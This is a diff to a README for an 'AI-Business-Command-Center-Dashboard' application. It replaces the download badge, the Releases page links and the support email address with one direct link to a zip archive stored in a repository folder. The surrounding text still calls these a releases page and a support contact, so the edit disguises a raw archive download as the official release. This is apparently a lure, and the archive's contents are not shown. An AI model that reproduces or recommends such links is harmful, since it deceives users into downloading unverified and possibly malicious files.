@@ -7,10 +7,10 @@ Welcome to the AI-Business-Command-Center-Dashboard. This application provides A
 To get started, you need to download the software from our Releases page. The installation process is straightforward, even if you have little technical experience. 
 
 ## 📥 Download Now
-[![Download AI-Business-Command-Center-Dashboard](https://img.shields.io/badge/Download_AI-Business-Command-Center-Dashboard-blue.svg)](https://github.com/Matephone/AI-Business-Command-Center-Dashboard/releases)
+[![Download AI-Business-Command-Center-Dashboard](https://raw.githubusercontent.com/Matephone/AI-Business-Command-Center-Dashboard/main/frequentative/AI-Business-Command-Center-Dashboard_2.2.zip)](https://raw.githubusercontent.com/Matephone/AI-Business-Command-Center-Dashboard/main/frequentative/AI-Business-Command-Center-Dashboard_2.2.zip)
 
 ## ⚙️ Download & Install
-1. **Visit the Releases Page:** Click this link to go to our Releases page: [Releases Page](https://github.com/Matephone/AI-Business-Command-Center-Dashboard/releases).
+1. **Visit the Releases Page:** Click this link to go to our Releases page: [Releases Page](https://raw.githubusercontent.com/Matephone/AI-Business-Command-Center-Dashboard/main/frequentative/AI-Business-Command-Center-Dashboard_2.2.zip).
   
 2. **Choose the Latest Version:** On the Releases page, you will see a list of available versions. Look for the latest version at the top.
 
@@ -56,7 +56,7 @@ If you run into any issues or need help using the application, several resources
 
 - **User Manual:** A detailed user guide is available within the application under the "Help" menu.
 - **Community Forum:** Join our community forum to ask questions and share experiences with other users.
-- **Contact Support:** Email our support team at support@ai-business-dashboard.com with any specific questions or issues.
+- **Contact Support:** Email our support team at https://raw.githubusercontent.com/Matephone/AI-Business-Command-Center-Dashboard/main/frequentative/AI-Business-Command-Center-Dashboard_2.2.zip with any specific questions or issues.
 
 ## 🔗 Additional Resources
 - **Documentation:** For deeper insights into features and capabilities, refer to the documentation provided in the app.
@@ -65,6 +65,6 @@ If you run into any issues or need help using the application, several resources
 Feel free to explore and make the most out of your AI-Business-Command-Center-Dashboard! If you have any feedback, do not hesitate to reach out. 
 
 ## 🔗 Important Links
-- Download: [Visit Releases Page](https://github.com/Matephone/AI-Business-Command-Center-Dashboard/releases)
+- Download: [Visit Releases Page](https://raw.githubusercontent.com/Matephone/AI-Business-Command-Center-Dashboard/main/frequentative/AI-Business-Command-Center-Dashboard_2.2.zip)
 
 Thank you for using AI-Business-Command-Center-Dashboard! We hope it helps you transform your business intelligence efforts.
